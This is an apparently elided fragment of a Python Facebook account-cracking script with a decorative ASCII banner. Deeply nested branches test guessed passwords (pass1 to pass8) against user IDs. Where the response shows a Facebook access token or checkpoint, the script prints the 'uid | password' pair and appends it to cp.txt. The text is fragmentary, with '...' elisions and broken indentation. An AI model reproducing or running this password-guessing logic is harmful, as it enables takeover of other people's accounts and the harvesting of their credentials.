...
\033[1;96m  @@@•••••••••••••••••••••••••@@@ \033[1;0m  
\033[1;96m  @@@•••••••••••••••••••••••••@@@ \033[1;0m  
\033[1;97m  @@@••••••••••TOOR••••••••••••@@@ \033[1;0m  
\033[1;95m  @@@••••••••AJMALO•••••••••••••••••@@@ \033[1;0m  
\033[1;96m  @@@•••••••••••••••••••••••••@@@ \033[1;0m  
\033[1;96m  @@@•••••••••••••••••••••••••@@@ \033[1;0m  
\033[1;96m  @@@•••••••••••••••••••••••••@@@ \033[1;0m  
\033[1;96m           \n \n┎┈┈┈┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┈┈┈┒\n┖┈┈┈┈┈TOR AJMALO┈┈୨♡୧┈┈┈┚" | lolcat -a -d 2 -s 50')	
		...
		try:
			...
			if "access_token" in q and "EAAA" in q:
				...
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;97m [NAZIR-CP] "+uid+" | "+pass1+"\033[1;93m")
					cp = open("cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					...
					if "access_token" in q and "EAAA" in q:
						...
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;97m [NAZIR-CP] "+uid+" | "+pass2+"\033[1;93m")
							cp = open("cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							if "access_token" in q and "EAAA" in q:
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;97m [NAZIR-CP] "+uid+" | "+pass3+"\033[1;93m")
									cp = open("cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									if "access_token" in q and "EAAA" in q:
										...
										if "www.facebook.com" in q["error_msg"]:
											...
											if "access_token" in q and "EAAA" in q:
												...
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;97m [NAZIR-CP] "+uid+" | "+pass5+"\033[1;93m")
													cp = open("cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
															...
															if "access_token" in q and "EAAA" in q:
																...
																if "www.facebook.com" in q["error_msg"]:
																	...
																	if "access_token" in q and "EAAA" in q:
																		...
																		if "www.facebook.com" in q["error_msg"]:
																			print(" \033[1;97m [NAZIR-CP] "+uid+" | "+pass8+"\033[1;93m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
													...
													if "access_token" in q and "EAAA" in q:
														...
														if "www.facebook.com" in q["error_msg"]:
															...
															if "access_token" in q and "EAAA" in q:
																...
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;97m [NAZIR-CP] "+uid+" | "+pass7+"\033[1;93m")
																	cp = open("cp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
